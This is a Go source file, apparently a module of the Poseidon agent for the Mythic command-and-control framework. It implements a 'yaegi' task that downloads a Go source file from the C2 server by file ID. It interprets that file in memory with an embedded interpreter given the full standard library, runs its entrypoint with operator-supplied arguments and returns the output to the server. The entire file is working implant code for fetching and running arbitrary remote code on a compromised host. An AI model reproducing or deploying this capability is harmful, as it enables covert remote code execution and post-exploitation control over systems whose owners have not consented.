package yaegi

import (
	"encoding/json"
	"fmt"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"

	// Yaegi
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

type yaegiArgs struct {
	FileID     string `json:"file_id"`
	Args 	   []string `json:"args"`
}

//Run - package function to run yaegi
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := yaegiArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID	
	r.FullPath = ""
	r.Task = &task
	r.SendUserStatusUpdates = true
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	extension := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			extension = append(extension, newBytes...)
		}
	}
	if len(extension) == 0 {
		msg.SetError(fmt.Sprintf("Failed to get file"))
		task.Job.SendResponses <- msg
		return
	}

	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)

	_, err = i.Eval(string(extension))
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	v, err := i.Eval("extension.entrypoint")
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	entrypoint := v.Interface().(func([]string) ([]byte, error))
	entrypoint_args := args.Args

	output, err := entrypoint(entrypoint_args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if task.DidStop() {

	} else {
		msg.Completed = true
		msg.UserOutput = string(output)
		task.Job.SendResponses <- msg
	}
	return
}